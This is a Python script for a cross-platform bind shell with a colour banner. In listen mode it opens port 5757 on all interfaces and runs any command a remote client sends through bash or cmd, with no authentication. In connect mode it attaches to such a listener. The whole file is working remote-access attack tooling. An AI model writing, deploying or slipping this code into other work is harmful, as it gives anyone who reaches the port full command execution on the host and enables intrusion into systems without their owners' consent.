
import socket
import subprocess
import threading
import argparse
import platform
from colorama import init, Fore, Back, Style

os = platform.platform()

DEFAULT_PORT = 5757
MAX_BUFFER = 4096


def execute_bash(bash):
    try:
        process = subprocess.Popen(["bash", "-c", bash], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output, error = process.communicate()
        if error:
            output = error
    except Exception as e:
        output = b"Command Failed! " + str(e).encode('utf-8')
    return output



def execute_cmd(cmd):
    try:
        output = subprocess.check_output(
            "cmd /c {}".format(cmd), stderr=subprocess.STDOUT)
    except:
        output = b"Command Failed!"
    return output


def decode_and_strip(s):
    return s.decode("latin-1").strip()


def shell_thread(s):
    s.send(b"[ -- Connected! --]")

    try:
        while True:

            s.send(b"\r\nEnter Command> ")

            data = s.recv(MAX_BUFFER)
            if data:
                buffer = decode_and_strip(data)

                if not buffer or buffer == "exit":
                    s.close()
                    exit()

            print("> Executing Command: '{}'".format(buffer))
            if 'macOS' in os:
                s.send(execute_bash(buffer))
            elif 'Windows' in os:
                s.send(execute_cmd(buffer))

    except:
        s.close()
        exit()


def send_thread(s):
    try:
        while True:
            data = input() + "\n"
            s.send(data.encode("latin-1"))
    except:
        s.close()
        exit()


def recv_thread(s):
    try:
        while True:
            data = decode_and_strip(s.recv(MAX_BUFFER))
            if data:
                print("\n" + data, end="", flush=True)
    except:
        s.close()
        exit()


def banner():
    print(Fore.GREEN + """
   \  |        |  |   _)  _ ) _)            | 
  |\/ |  |  |  |   _|  |  _ \  |    \    _` | 
 _|  _| \_,_| _| \__| _| ___/ _| _| _| \__,_| 
                                              
        """)


def server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", DEFAULT_PORT))
    s.listen()
    banner()
    print("[ -- Starting Bind Shell -- ]")
    while True:
        client_socket, addr = s.accept()
        print("[ -- New User Connected  -- ]")
        threading.Thread(target=shell_thread, args=(client_socket,)).start()


def client(ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, DEFAULT_PORT))

    print("[ -- Connecting to bind shell --]")

    threading.Thread(target=send_thread, args=(s,)).start()
    threading.Thread(target=recv_thread, args=(s,)).start()


parser = argparse.ArgumentParser()

parser.add_argument("-l", "--listen", action="store_true",
                    help="Setup a bind shell", required=False)

parser.add_argument("-c", "--connect",
                    help="Connect to a bind shell", required=False)

args = parser.parse_args()

if args.listen:
    server()
elif args.connect:
    client(args.connect)


